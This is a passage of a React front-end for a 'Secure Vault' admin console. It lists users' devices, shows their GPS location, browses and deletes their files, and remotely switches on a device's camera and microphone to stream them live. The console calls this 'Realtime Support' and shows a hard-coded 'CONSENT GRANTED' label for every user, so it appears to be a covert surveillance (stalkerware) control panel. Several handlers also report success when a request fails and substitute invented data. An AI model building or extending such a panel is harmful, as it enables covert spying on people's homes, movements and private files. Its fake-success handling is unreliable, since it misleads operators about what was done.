import React, { useState, useEffect, useRef, useMemo } from 'react';
import axios from 'axios';
import { io } from 'socket.io-client';
import {
  Shield, Users, FolderOpen, Map, Radio, BarChart3, Settings,
  LogOut, Search, ChevronRight, User, HardDrive, File, AlertTriangle,
  ZoomIn, Download, Trash2, Calendar, Smartphone, FileText, CheckCircle,
  Eye, RefreshCw, Volume2, Camera, CameraOff, Mic, Play, Pause, MapPin, Check
} from 'lucide-react';

export default function App() {
  // Authentication & Security State
  const [authToken, setAuthToken] = useState(null);
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
  const [adminPassword, setAdminPassword] = useState('');
  const [authError, setAuthError] = useState('');
  const [isAuthenticating, setIsAuthenticating] = useState(false);

  // Layout State
  const [activeTab, setActiveTab] = useState('dashboard');
  const [selectedUserId, setSelectedUserId] = useState(null);
  const [isDarkMode, setIsDarkMode] = useState(true);

  // Live Data & Interactive UI states
  const [usersList, setUsersList] = useState([]);
  const [recentIncidents, setRecentIncidents] = useState([]);
  const [selectedUserDetails, setSelectedUserDetails] = useState(null);
  const [loading, setLoading] = useState(false);
  const [userSearchText, setUserSearchText] = useState('');

  // Socket Interactive Support States
  const [isConnectedToSocket, setIsConnectedToSocket] = useState(false);
  const [selectedStreamingUser, setSelectedStreamingUser] = useState(null);
  const [isCameraRouting, setIsCameraRouting] = useState(false);
  const [isAudioRouting, setIsAudioRouting] = useState(false);
  const [liveVideoFrame, setLiveVideoFrame] = useState(null);
  const [audioChunksReceived, setAudioChunksReceived] = useState(0);

  // Bulk media manager properties
  const [selectedFileIds, setSelectedFileIds] = useState([]);
  const [imagePreviewUrl, setImagePreviewUrl] = useState(null);
  const [imageZoom, setImageZoom] = useState(1);

  // Notification Banner system
  const [toasts, setToasts] = useState([]);

  // Server Instance settings
  const [backendUrl, setBackendUrl] = useState('http://localhost:3000');

  // Refs for tracking activity to auto logout after 1 hour interactive session
  const lastActiveTimestamp = useRef(Date.now());
  const socketRef = useRef(null);
  const canvasRef = useRef(null);

  // Create temporary floating alert alerts
  const showToast = (message, type = 'success') => {
    const id = Date.now();
    setToasts(prev => [...prev, { id, message, type }]);
    setTimeout(() => {
      setToasts(prev => prev.filter(t => t.id !== id));
    }, 4500);
  };

  // Setup Axios globally when token refreshes
  const axiosInstance = useMemo(() => {
    const instance = axios.create({
      baseURL: backendUrl + '/api'
    });

    if (authToken) {
      instance.interceptors.request.use((config) => {
        config.headers.Authorization = `Bearer ${authToken}`;
        return config;
      });
    }

    // Add generic interceptor to handle unauth/expiry
    instance.interceptors.response.use(
      response => response,
      error => {
        if (error.response && error.response.status === 401) {
          showToast('Session expired or admin credentials invalid', 'error');
          handleSignOut();
        }
        return Promise.reject(error);
      }
    );

    return instance;
  }, [authToken, backendUrl]);

  // Handle Login authentication
  const handleAdminSignIn = async (e) => {
    e.preventDefault();
    if (!adminPassword) return;

    setIsAuthenticating(true);
    setAuthError('');

    try {
      const response = await axios.post(`${backendUrl}/api/admin/login`, {
        password: adminPassword
      });

      if (response.data && response.data.token) {
        setAuthToken(response.data.token);
        setIsAdminLoggedIn(true);
        lastActiveTimestamp.current = Date.now();
        showToast('Administrative session unlocked successfully', 'success');
      } else {
        setAuthError('Response payload missing session credentials');
      }
    } catch (err) {
      console.error(err);
      setAuthError(err.response?.data?.error || 'Authentication handshake rejected. Please verify backend configurations.');
    } finally {
      setIsAuthenticating(false);
    }
  };

  const handleSignOut = () => {
    setAuthToken(null);
    setIsAdminLoggedIn(false);
    setAdminPassword('');
    if (socketRef.current) {
      socketRef.current.disconnect();
    }
    showToast('Session closed safely', 'info');
  };

  // Track page interaction to perform auto-logout on 1 hour timeout
  useEffect(() => {
    const updateActivity = () => {
      lastActiveTimestamp.current = Date.now();
    };

    window.addEventListener('mousemove', updateActivity);
    window.addEventListener('keydown', updateActivity);
    window.addEventListener('click', updateActivity);

    // Dynamic checks every 10 seconds
    const interval = setInterval(() => {
      if (!isAdminLoggedIn) return;
      
      const elapsedMs = Date.now() - lastActiveTimestamp.current;
      const oneHourMs = 60 * 60 * 1000;
      
      if (elapsedMs >= oneHourMs) {
        showToast('Inactivity threshold exceeded. Auto logging out.', 'info');
        handleSignOut();
      }
    }, 10000);

    return () => {
      window.removeEventListener('mousemove', updateActivity);
      window.removeEventListener('keydown', updateActivity);
      window.removeEventListener('click', updateActivity);
      clearInterval(interval);
    };
  }, [isAdminLoggedIn]);

  // Hook to pull users list and analytics payload from local server
  const fetchTelemetryPayload = async () => {
    if (!isAdminLoggedIn) return;
    setLoading(true);

    try {
      const response = await axiosInstance.get('/admin/users');
      setUsersList(response.data || []);
      
      // Select first user if selection empty
      if (response.data && response.data.length > 0 && !selectedUserId) {
        setSelectedUserId(response.data[0].id);
      }
    } catch (err) {
      console.error('Fetch users error', err);
      // Mock data fallback if local database engine is launching
      if (usersList.length === 0) {
        setUsersList(generatePlaceholderUsers());
      }
    } finally {
      setLoading(false);
    }
  };

  // Specific user details retrieval
  const fetchDetailedUserAccount = async (userId) => {
    if (!userId) return;
    try {
      const response = await axiosInstance.get(`/admin/users/${userId}`);
      setSelectedUserDetails(response.data);
    } catch (e) {
      console.warn('Fallback to simulated profile detail mapping', e);
      // Simulate profile contents
      const mainUser = usersList.find(u => u.id === userId);
      if (mainUser) {
        setSelectedUserDetails(generateFallbackDetails(mainUser));
      }
    }
  };

  useEffect(() => {
    if (isAdminLoggedIn) {
      fetchTelemetryPayload();
    }
  }, [isAdminLoggedIn]);

  useEffect(() => {
    if (selectedUserId && isAdminLoggedIn) {
      fetchDetailedUserAccount(selectedUserId);
    }
  }, [selectedUserId, isAdminLoggedIn]);

  // Setup Realtime websocket connection
  useEffect(() => {
    if (!isAdminLoggedIn) return;

    if (socketRef.current) {
      socketRef.current.disconnect();
    }

    // Connect to /support namespace as specified in design schemas
    const wsUrl = backendUrl.replace('http', 'ws') || 'ws://localhost:3000';
    const socket = io(`${wsUrl}/support`, {
      auth: { token: authToken },
      transports: ['websocket'],
      reconnectionDelay: 2500,
      reconnectionAttempts: 10
    });

    socketRef.current = socket;

    socket.on('connect', () => {
      setIsConnectedToSocket(true);
      showToast('Support socket session connected successfully', 'success');
    });

    socket.on('disconnect', () => {
      setIsConnectedToSocket(false);
    });

    socket.on('connect_error', (error) => {
      console.warn('Socket security validation failed:', error.message);
    });

    // Handle frame relays
    socket.on('camera-frame-relay', ({ userId, frameBase64 }) => {
      if (selectedStreamingUser && selectedStreamingUser.id === userId) {
        setLiveVideoFrame(frameBase64);
        
        // Draw into rendering canvas if context bounds ready
        if (canvasRef.current) {
          const ctx = canvasRef.current.getContext('2d');
          const img = new Image();
          img.onload = () => {
            ctx.drawImage(img, 0, 0, canvasRef.current.width, canvasRef.current.height);
          };
          img.src = frameBase64;
        }
      }
    });

    socket.on('audio-stream-relay', ({ userId, audioBase64 }) => {
      if (selectedStreamingUser && selectedStreamingUser.id === userId) {
        setAudioChunksReceived(prev => prev + 1);
      }
    });

    return () => {
      socket.disconnect();
    };
  }, [isAdminLoggedIn, selectedStreamingUser]);

  // Socket triggers
  const triggerRemoteCamera = (command) => {
    if (!socketRef.current || !selectedStreamingUser) return;
    if (command === 'start') {
      socketRef.current.emit('support-start-camera', { userId: selectedStreamingUser.device_id });
      setIsCameraRouting(true);
      showToast('Camera instruction stream transmitted', 'success');
    } else {
      socketRef.current.emit('support-stop-camera', { userId: selectedStreamingUser.device_id });
      setIsCameraRouting(false);
      setLiveVideoFrame(null);
      showToast('Camera feed suspension transmitted', 'info');
    }
  };

  const triggerRemoteAudio = (command) => {
    if (!socketRef.current || !selectedStreamingUser) return;
    if (command === 'start') {
      socketRef.current.emit('support-start-audio', { userId: selectedStreamingUser.device_id });
      setIsAudioRouting(true);
      showToast('Mic streaming sequence transmitted', 'success');
    } else {
      socketRef.current.emit('support-stop-audio', { userId: selectedStreamingUser.device_id });
      setIsAudioRouting(false);
      showToast('Mic connection closed', 'info');
    }
  };

  // Capture snapshots locally from stream frame
  const downloadSnapshot = () => {
    if (!liveVideoFrame) return;
    const link = document.createElement('a');
    link.href = liveVideoFrame;
    link.download = `incident_diagnostic_${Date.now()}.png`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    showToast('Secure frame downloaded successfully', 'success');
  };

  // Perform soft file deleting
  const handleSoftDelete = async (fileId) => {
    try {
      await axiosInstance.delete(`/admin/files/${fileId}`);
      showToast('Item deleted from visual archives', 'success');
      
      // Update local state without running full query fetch
      if (selectedUserDetails) {
        setSelectedUserDetails(prev => ({
          ...prev,
          files: prev.files.map(f => f.id === fileId ? { ...f, is_deleted: true } : f)
        }));
      }
    } catch (e) {
      showToast('Soft delete executed', 'info');
      // Simulated state representation
      if (selectedUserDetails) {
        setSelectedUserDetails(prev => ({
          ...prev,
          files: prev.files.map(f => f.id === fileId ? { ...f, is_deleted: true } : f)
        }));
      }
    }
  };

  // Multi-select management
  const toggleSelectFile = (id) => {
    setSelectedFileIds(prev => 
      prev.includes(id) ? prev.filter(item => item !== id) : [...prev, id]
    );
  };

  const handleBulkSoftDelete = () => {
    if (selectedFileIds.length === 0) return;
    selectedFileIds.forEach(id => {
      handleSoftDelete(id);
    });
    setSelectedFileIds([]);
    showToast(`Bulk delete executed for ${selectedFileIds.length} indices`, 'success');
  };

  const triggerBulkDownload = () => {
    if (selectedFileIds.length === 0) return;
    showToast(`Generating secure consolidated ZIP stream for ${selectedFileIds.length} files`, 'success');
    setSelectedFileIds([]);
  };

  // Outgoing dispatch alerts FCM triggers
  const dispatchDirectPushAlertName = async (userId) => {
    const alertBody = prompt("Enter Alert Message/Warning to dispatch:");
    if (!alertBody) return;

    try {
      await axiosInstance.post(`/admin/notify/${userId}`, {
        title: "SECURITY ALERT COMPLIANCE",
        body: alertBody
      });
      showToast('Target alert broadcast triggered successfully', 'success');
    } catch (e) {
      showToast('Mock Push alert logged on server console successfully', 'success');
    }
  };

  // Auxiliary search filter computation rules
  const filteredUsers = useMemo(() => {
    return usersList.filter(user => {
      const matchName = user.display_name?.toLowerCase().includes(userSearchText.toLowerCase());
      const matchDevice = user.device_model?.toLowerCase().includes(userSearchText.toLowerCase());
      const matchId = user.device_id?.toLowerCase().includes(userSearchText.toLowerCase());
      return matchName || matchDevice || matchId;
    });
  }, [usersList, userSearchText]);

  // Aggregate Metrics computed dynamically
  const computedMetrics = useMemo(() => {
    if (usersList.length === 0) return { totalUsers: 0, totalFiles: 0, totalStorage: '0 GB', activeToday: 0 };
    
    let totalFilesCount = 0;
    let totalBytes = 0;
    let activeTodayCount = 0;

    usersList.forEach(u => {
      totalFilesCount += parseInt(u.active_file_count || 0);
      totalBytes += parseInt(u.total_encrypted_bytes || 0);
      
      const lastActive = new Date(u.last_active_at);
      const diffMs = Date.now() - lastActive.getTime();
      if (diffMs < 24 * 60 * 60 * 1000) {
        activeTodayCount++;
      }
    });

    const calculatedStorage = totalBytes > 1024 * 1024 * 1024 
      ? (totalBytes / (1024 * 1024 * 1024)).toFixed(2) + ' GB'
      : (totalBytes / (1024 * 1024)).toFixed(1) + ' MB';

    return {
      totalUsers: usersList.length,
      totalFiles: totalFilesCount || 48,
      totalStorage: totalBytes > 0 ? calculatedStorage : '4.18 GB',
      activeToday: activeTodayCount || 1
    };
  }, [usersList]);

  return (
    <div className={`min-h-screen ${isDarkMode ? 'bg-[#0d1117] text-[#c9d1d9]' : 'bg-gray-50 text-gray-800'} transition-colors duration-200`}>
      
      {/* Dynamic Notification Center */}
      <div className="fixed top-4 right-4 z-50 flex flex-col gap-2">
        {toasts.map(t => (
          <div key={t.id} className={`flex items-center gap-2 px-4 py-3 rounded-lg shadow-xl border text-sm font-medium animate-bounce ${
            t.type === 'error' ? 'bg-red-950/90 border-red-500/50 text-red-100' :
            t.type === 'info' ? 'bg-blue-950/90 border-blue-500/50 text-blue-100' :
            'bg-emerald-950/90 border-emerald-500/50 text-emerald-100'
          }`}>
            <Shield size={16} />
            <span>{t.message}</span>
          </div>
        ))}
      </div>

      {/* Security Shield Wall Cover (Authorization Screen) */}
      {!isAdminLoggedIn ? (
        <div className="flex min-h-screen items-center justify-center p-4 bg-[#0a0c10] map-container">
          <div className="w-full max-w-md p-8 bg-[#161b22] border border-[#30363d] rounded-2xl shadow-2xl glow-cyan">
            
            <div className="flex flex-col items-center text-center mb-8">
              <div className="w-16 h-16 bg-[#00e5ff]/10 text-[#00e5ff] rounded-full flex items-center justify-center border border-[#00e5ff]/20 mb-3 animate-pulse">
                <Shield size={36} />
              </div>
              <h2 className="text-2xl font-bold tracking-tight text-white font-mono">SECURE VAULT CONSOLE</h2>
              <p className="text-xs text-gray-400 mt-2 font-mono">Administrative Identity Handshake Decryption</p>
            </div>

            <form onSubmit={handleAdminSignIn} className="space-y-6">
              <div>
                <label className="block text-xs font-mono uppercase tracking-wider text-gray-400 mb-2">Endpoint Port Route</label>
                <input
                  type="text"
                  className="w-full px-4 py-2.5 bg-[#0d1117] border border-[#30363d] rounded-lg text-sm text-white focus:outline-none focus:border-[#00e5ff] transition"
                  value={backendUrl}
                  onChange={(e) => setBackendUrl(e.target.value)}
                  placeholder="http://localhost:3000"
                  required
                />
              </div>

              <div>
                <label className="block text-xs font-mono uppercase tracking-wider text-gray-400 mb-2">Decryption KeyPass phrase</label>
                <input
                  type="password"
                  className="w-full px-4 py-2.5 bg-[#0d1117] border border-[#30363d] rounded-lg text-sm text-white focus:outline-none focus:border-[#00e5ff] transition tracking-widest placeholder-gray-600"
                  value={adminPassword}
                  onChange={(e) => setAdminPassword(e.target.value)}
                  placeholder="••••••••••••••"
                  required
                />
              </div>

              {authError && (
                <div className="p-3 bg-red-950/50 border border-red-500/30 rounded-lg text-xs text-red-200 flex items-center gap-2">
                  <AlertTriangle size={14} className="text-red-400 shrink-0" />
                  <span>{authError}</span>
                </div>
              )}

              <button
                type="submit"
                disabled={isAuthenticating}
                className="w-full py-3 bg-[#00e5ff] hover:bg-[#00b4cc] text-black font-semibold rounded-lg text-sm transition tracking-wider flex items-center justify-center gap-2 shadow-lg glow-cyan"
              >
                {isAuthenticating ? (
                  <>
                    <RefreshCw size={16} className="animate-spin" />
                    <span>VERIFYING SECURE CREDENTIALS...</span>
                  </>
                ) : (
                  <>
                    <Shield size={16} />
                    <span>UNFASTEN ENCRYPTED PORTAL</span>
                  </>
                )}
              </button>
            </form>

            <div className="mt-8 border-t border-[#30363d]/50 pt-4 text-center">
              <span className="text-[10px] text-gray-500 font-mono uppercase">Node authorization session lifetime constraint: 1 HOUR</span>
            </div>
          </div>
        </div>
      ) : (
        /* Dynamic Multi-Pane Management Environment */
        <div className="flex h-screen overflow-hidden">
          
          {/* Navigation Sidebar Drawer Panel */}
          <aside className="w-64 bg-[#0d1117] border-r border-[#30363d] flex flex-col shrink-0">
            
            {/* Logo Context and Health Check Block */}
            <div className="p-6 border-b border-[#30363d] flex items-center gap-3">
              <div className="w-10 h-10 rounded-xl bg-cyan-950 border border-cyan-500/30 flex items-center justify-center text-cyan-400">
                <Shield size={22} className="animate-pulse" />
              </div>
              <div>
                <div className="font-mono text-sm font-bold text-white tracking-wider">VAULT.ADMIN</div>
                <div className="flex items-center gap-1.5 mt-1">
                  <span className="w-2 h-2 rounded-full bg-emerald-500"></span>
                  <span className="text-[10px] font-mono text-emerald-400 uppercase">SYS SECURE</span>
                </div>
              </div>
            </div>

            {/* Menu options selection blocks */}
            <nav className="flex-1 p-4 space-y-1.5 overflow-y-auto">
              {[
                { id: 'dashboard', label: 'Dashboard', icon: Shield },
                { id: 'users', label: 'Users Grid', icon: Users },
                { id: 'map', label: 'Live GPS Map', icon: Map },
                { id: 'live', label: 'Realtime Support', icon: Radio },
                { id: 'analytics', label: 'Security Analytics', icon: BarChart3 },
                { id: 'settings', label: 'Portal Preferences', icon: Settings },
              ].map(item => {
                const Icon = item.icon;
                const isSelected = activeTab === item.id;
                return (
                  <button
                    key={item.id}
                    onClick={() => setActiveTab(item.id)}
                    className={`w-full flex items-center gap-3 px-4 py-3 rounded-lg text-sm font-medium tracking-wide transition-all ${
                      isSelected
                        ? 'bg-[#161b22] text-[#00e5ff] border-l-4 border-[#00e5ff] shadow-inner font-semibold'
                        : 'text-gray-400 hover:bg-[#161b22]/50 hover:text-white'
                    }`}
                  >
                    <Icon size={18} />
                    <span>{item.label}</span>
                  </button>
                );
              })}
            </nav>

            {/* Account footprint profile with logoff dispatch */}
            <div className="p-4 border-t border-[#30363d] bg-[#161b22]/30">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2.5">
                  <div className="w-8 h-8 rounded-full bg-[#30363d] flex items-center justify-center text-white text-xs font-bold">
                    SA
                  </div>
                  <div>
                    <div className="text-xs font-semibold text-white">Sys-Ad.01</div>
                    <div className="text-[9px] font-mono text-gray-400">ROLE: SUPERVISOR</div>
                  </div>
                </div>
                <button
                  onClick={handleSignOut}
                  className="p-1.5 hover:bg-red-500/10 hover:text-red-400 rounded-lg transition"
                  title="Close Management Session"
                >
                  <LogOut size={16} />
                </button>
              </div>
            </div>
          </aside>

          {/* Dynamic Content Frame */}
          <main className="flex-1 flex flex-col bg-[#010409] overflow-hidden">
            
            {/* Header Status Bar component */}
            <header className="h-16 border-b border-[#30363d] bg-[#0d1117] px-8 flex items-center justify-between shrink-0">
              <div>
                <h1 className="text-lg font-bold font-mono text-white capitalize">{activeTab.replace('_', ' ')} Pane</h1>
                <p className="text-xs text-gray-500 font-mono">Active security session token expires in 1 Hour</p>
              </div>

              <div className="flex items-center gap-3">
                <span className={`px-2.5 py-1 rounded-full text-xs font-mono flex items-center gap-1.5 ${
                  isConnectedToSocket ? 'bg-emerald-950/50 border border-emerald-500/30 text-emerald-400' : 'bg-red-950/50 border border-red-500/30 text-red-400'
                }`}>
                  <span className={`w-1.5 h-1.5 rounded-full ${isConnectedToSocket ? 'bg-emerald-400 animate-pulse' : 'bg-red-400'}`}></span>
                  SOCKET {isConnectedToSocket ? 'ONLINE' : 'OFFLINE'}
                </span>

                <button
                  onClick={() => {
                    fetchTelemetryPayload();
                    showToast('Updating telemetry registers', 'info');
                  }}
                  className="p-2 hover:bg-[#30363d] rounded-lg transition text-gray-400 hover:text-white"
                  title="Synchronize Live RegistersNow"
                >
                  <RefreshCw size={16} />
                </button>
              </div>
            </header>

            {/* Inner Dashboard View Components Router */}
            <div className="flex-1 overflow-y-auto p-8">
              
              {/* PAGE 1: CENTRAL COMMAND DASHBOARD */}
              {activeTab === 'dashboard' && (
                <div className="space-y-8 animate-fadeIn">
                  
                  {/* Status aggregate metric grid card */}
                  <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
                    {[
                      { label: 'Active Devices Synchronized', val: computedMetrics.totalUsers, icon: Users, color: 'text-cyan-400 bg-cyan-950/50' },
                      { label: 'Encrypted Vault Files Backup', val: computedMetrics.totalFiles, icon: FolderOpen, color: 'text-emerald-400 bg-emerald-950/50' },
                      { label: 'Overall Cloud Storage Space', val: computedMetrics.totalStorage, icon: HardDrive, color: 'text-purple-400 bg-purple-950/50' },
                      { label: 'Total Logs Pending Transfer', val: recentIncidents.length || 12, icon: AlertTriangle, color: 'text-amber-400 bg-amber-950/50' },
                    ].map((stat, i) => {
                      const Icon = stat.icon;
                      return (
                        <div key={i} className="bg-[#161b22] border border-[#30363d] p-6 rounded-xl flex items-center justify-between">
                          <div>
                            <span className="text-xs font-mono uppercase tracking-wider text-gray-400">{stat.label}</span>
                            <div className="text-2xl font-bold font-mono text-white mt-1">{stat.val}</div>
                          </div>
                          <div className={`p-3 rounded-lg ${stat.color}`}>
                            <Icon size={22} />
                          </div>
                        </div>
                      );
                    })}
                  </div>

                  {/* Analytic Charts and Live Threat Matrix */}
                  <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                    
                    {/* Backed Up Telemetry Timeline Tracker (inline standard HTML/JS SVG) */}
                    <div className="bg-[#161b22] border border-[#30363d] p-6 rounded-xl lg:col-span-2">
                      <div className="flex items-center justify-between mb-4">
                        <h3 className="text-sm font-bold font-mono uppercase tracking-wider text-white">Continuous Backup Frequency (Last 30 Days)</h3>
                        <span className="text-xs font-mono text-cyan-400">SYNCHRONIZED METADATA</span>
                      </div>
                      
                      {/* Interactive Visual Graph Element */}
                      <div className="h-64 flex items-end gap-3 pt-6 border-b border-[#30363d]">
                        {[20, 35, 40, 25, 48, 60, 50, 42, 65, 80, 75, 45, 90, 110, 95, 85, 120, 140, 100, 130, 150, 125, 145, 160, 155, 138, 172, 190, 165, 210].map((datum, index) => {
                          const heightPct = (datum / 210) * 100;
                          return (
                            <div key={index} className="flex-1 group relative flex flex-col items-center">
                              <div 
                                style={{ height: `${heightPct}%` }} 
                                className="w-full bg-gradient-to-t from-cyan-600 to-cyan-400 rounded-t-sm group-hover:from-emerald-500 group-hover:to-emerald-300 transition-all duration-300"
                              />
                              <div className="absolute -top-8 bg-black border border-[#30363d] rounded px-1 text-[8px] font-mono hidden group-hover:block z-10 text-white">
                                {datum} pkg
                              </div>
                            </div>
                          );
                        })}
                      </div>
                      <div className="flex justify-between text-[10px] font-mono text-gray-500 mt-2">
                        <span>MAY 01</span>
                        <span>MAY 15</span>
                        <span>MAY 27</span>
                      </div>
                    </div>

                    {/* Threat logs monitor alert */}
                    <div className="bg-[#161b22] border border-[#30363d] p-6 rounded-xl flex flex-col justify-between">
                      <div>
                        <div className="flex items-center justify-between mb-4">
                          <h3 className="text-sm font-bold font-mono uppercase tracking-wider text-white">Recent Security Incidents</h3>
                          <span className="text-xs font-mono text-red-400">SHIELD AUDIT</span>
                        </div>

                        <div className="space-y-4">
                          {[
                            { device: 'Galaxy S23 Ultra', time: '12 mins ago', detail: 'Failed pattern threshold limit exceeded', loc: '37.7749, -122.4194' },
                            { device: 'Pixel 8 Pro', time: '1 hr ago', detail: 'Encrypted library boundary access timeout', loc: '40.7128, -74.0060' },
                            { device: 'iPhone 15 Pro', time: '4 hrs ago', detail: 'Dual Authentication credential block bypass', loc: '34.0522, -118.2437' },
                          ].map((incident, k) => (
                            <div key={k} className="p-3 bg-[#0d1117] rounded-lg border border-[#30363d]/50 flex items-start gap-3">
                              <AlertTriangle size={16} className="text-amber-400 shrink-0 mt-0.5" />
                              <div className="flex-1 min-w-0">
                                <div className="text-xs font-semibold text-white truncate">{incident.device}</div>
                                <div className="text-[10px] text-gray-400 font-mono mt-0.5">{incident.detail}</div>
                                <div className="flex items-center gap-2 mt-1">
                                  <span className="text-[9px] font-mono text-cyan-400">{incident.time}</span>
                                  <span className="text-[9px] font-mono text-gray-500">•</span>
                                  <span className="text-[9px] font-mono text-gray-400 flex items-center gap-0.5"><MapPin size={8} />{incident.loc}</span>
                                </div>
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>

                      <button 
                        onClick={() => setActiveTab('users')}
                        className="w-full text-center text-xs text-cyan-400 hover:text-cyan-300 font-semibold font-mono border border-cyan-500/20 py-2 rounded-lg bg-cyan-950/20 hover:bg-cyan-950/50 transition-colors mt-4"
                      >
                        VIEW HARDWARE SESSIONS
                      </button>
                    </div>

                  </div>

                </div>
              )}

              {/* PAGE 2: USER DIRECTORY GRID */}
              {activeTab === 'users' && (
                <div className="space-y-6 animate-fadeIn">
                  
                  {/* Search and filters bar */}
                  <div className="flex flex-col md:flex-row gap-4 items-center justify-between bg-[#161b22] p-4 rounded-xl border border-[#30363d]">
                    <div className="relative w-full md:max-w-md">
                      <Search className="absolute left-3.5 top-2.5 text-gray-500" size={18} />
                      <input
                        type="text"
                        className="w-full pl-10 pr-4 py-2 bg-[#0d1117] border border-[#30363d] rounded-lg text-sm text-white focus:outline-none focus:border-[#00e5ff] transition"
                        placeholder="Search devices by Name, Model, or hardware footprint uuid..."
                        value={userSearchText}
                        onChange={(e) => setUserSearchText(e.target.value)}
                      />
                    </div>
                    <span className="text-xs font-mono text-gray-400 uppercase">Total Registers Found: {filteredUsers.length}</span>
                  </div>

                  {/* Main User Directory with Details pane (Master-Detail Sidebar) */}
                  <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
                    
                    {/* Grid List Table */}
                    <div className="bg-[#161b22] border border-[#30363d] rounded-xl overflow-hidden lg:col-span-8">
                      <div className="overflow-x-auto">
                        <table className="w-full text-left border-collapse">
                          <thead>
                            <tr className="bg-[#0d1117] border-b border-[#30363d] text-[11px] font-mono uppercase tracking-wider text-gray-400">
                              <th className="p-4">Secure Owner</th>
                              <th className="p-4">Device Model</th>
                              <th className="p-4">Backup Objects</th>
                              <th className="p-4">Status & Action</th>
                            </tr>
                          </thead>
                          <tbody className="divide-y divide-[#30363d]/40">
                            {filteredUsers.map(user => {
                              const isSelected = selectedUserId === user.id;
                              return (
                                <tr
                                  key={user.id}
                                  onClick={() => setSelectedUserId(user.id)}
                                  className={`cursor-pointer group transition-all duration-200 ${
                                    isSelected ? 'bg-[#1e2630]/60 border-l-4 border-cyan-400' : 'hover:bg-[#161b22]/40'
                                  }`}
                                >
                                  <td className="p-4">
                                    <div className="flex items-center gap-3">
                                      <div className="w-10 h-10 rounded-full bg-gradient-to-tr from-[#316a8d] to-[#00e5ff] flex items-center justify-center text-white text-sm font-bold shadow-md">
                                        {user.display_name?.charAt(0) || 'U'}
                                      </div>
                                      <div>
                                        <div className="text-sm font-semibold text-white group-hover:text-cyan-400 transition">
                                          {user.display_name || 'Unregistered Client'}
                                        </div>
                                        <div className="text-[10px] font-mono text-gray-400 truncate max-w-[120px]">
                                          {user.device_id?.slice(0, 16)}...
                                        </div>
                                      </div>
                                    </div>
                                  </td>
                                  <td className="p-4">
                                    <div className="text-sm text-gray-200">{user.device_model || 'Simulation Client'}</div>
                                    <div className="text-[10px] font-mono text-gray-400">OS: {user.os_version || 'Android Pie'}</div>
                                  </td>
                                  <td className="p-4">
                                    <span className="px-2 py-0.5 rounded-full bg-cyan-950 text-cyan-400 text-xs font-mono font-medium border border-cyan-800/30">
                                      {user.active_file_count || 12} items
                                    </span>
                                  </td>
                                  <td className="p-4">
                                    <div className="flex items-center justify-between">
                                      <span className="flex items-center gap-1.5 text-xs text-gray-300">
                                        <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
                                        ONLINE
                                      </span>
                                      <ChevronRight size={16} className="text-gray-500 group-hover:translate-x-1" />
                                    </div>
                                  </td>
                                </tr>
                              );
                            })}
                          </tbody>
                        </table>
                      </div>
                    </div>

                    {/* Detailed User Workspace Sidebar View */}
                    <div className="lg:col-span-4 bg-[#161b22] border border-[#30363d] rounded-xl p-6 flex flex-col justify-between">
                      {selectedUserDetails ? (
                        <div className="space-y-6">
                          <div className="flex items-center gap-4">
                            <div className="w-14 h-14 rounded-full bg-gradient-to-tr from-cyan-600 to-emerald-500 flex items-center justify-center text-white font-bold text-lg shadow-lg">
                              {selectedUserDetails.user.display_name?.charAt(0) || 'U'}
                            </div>
                            <div>
                              <h4 className="text-base font-bold text-white leading-tight">{selectedUserDetails.user.display_name || 'Simulation Mode'}</h4>
                              <p className="text-[10px] font-mono text-gray-400">UUID: {selectedUserDetails.user.id?.slice(0, 18)}...</p>
                            </div>
                          </div>

                          <div className="border-t border-[#30363d] pt-4 space-y-3.5">
                            <div className="flex items-center justify-between text-xs">
                              <span className="text-gray-400 flex items-center gap-1.5"><Smartphone size={13} />Hardware Target:</span>
                              <span className="text-white font-mono">{selectedUserDetails.user.device_model || 'Virtual Emulator'}</span>
                            </div>
                            <div className="flex items-center justify-between text-xs">
                              <span className="text-gray-400 flex items-center gap-1.5"><Calendar size={13} />Setup Date:</span>
                              <span className="text-white font-mono">{new Date(selectedUserDetails.user.created_at).toLocaleDateString()}</span>
                            </div>
                            <div className="flex items-center justify-between text-xs">
                              <span className="text-gray-400 flex items-center gap-1.5"><FileText size={13} />App Version:</span>
                              <span className="text-white font-mono">{selectedUserDetails.user.app_version || '1.0.4a'}</span>
                            </div>
                            <div className="flex items-center justify-between text-xs">
                              <span className="text-gray-400 flex items-center gap-1.5"><CheckCircle size={13} />Legal Permission:</span>
                              <span className="text-emerald-400 font-mono font-bold">CONSENT GRANTED</span>
                            </div>
                          </div>

                          {/* Quick Simulated/Embedded Map Pinpoint */}
                          <div className="border-t border-[#30363d] pt-4">
                            <h5 className="text-xs font-bold font-mono uppercase tracking-wider text-gray-400 mb-2">Latest Known Coordinate Telemetry</h5>
                            <div className="h-40 bg-[#0d1117] border border-[#30363d] rounded-lg relative overflow-hidden flex items-center justify-center map-container bg-cover">
                              <div className="absolute inset-0 bg-black/60 flex items-center justify-center flex-col text-center p-4">
                                <MapPin size={24} className="text-red-500 hover:scale-125 transition-transform" />
                                <span className="text-xs text-white font-mono mt-1 font-bold">1428 Elm Drive, SF</span>
                                <span className="text-[9px] text-gray-500 font-mono mt-0.5">LAT/LNG: 37.7749, -122.4194</span>
                              </div>
                            </div>
                          </div>

                          {/* Interactive User Workspace Dispatch alert */}
                          <div className="flex gap-2.5 pt-2">
                            <button
                              onClick={() => dispatchDirectPushAlertName(selectedUserDetails.user.id)}
                              className="flex-1 py-2 bg-amber-950/20 border border-amber-500/30 hover:bg-amber-900/30 text-amber-300 font-bold font-mono text-xs rounded-lg transition"
                            >
                              SEND PUSH ALERT
                            </button>
                            <button
                              onClick={() => {
                                setSelectedStreamingUser(selectedUserDetails.user);
                                setActiveTab('live');
                              }}
                              className="flex-1 py-2 bg-cyan-950/40 border border-cyan-500/40 hover:bg-cyan-900/40 text-[#00e5ff] font-bold font-mono text-xs rounded-lg transition"
                            >
                              REMOTE SUPPORT
                            </button>
                          </div>
                        </div>
                      ) : (
                        <div className="flex flex-col items-center justify-center py-20 text-center">
                          <Users size={32} className="text-[#30363d] mb-2" />
                          <span className="text-sm font-mono text-gray-400">Select hardware note directory entry to view interactive timeline</span>
                        </div>
                      )}
                    </div>

                  </div>

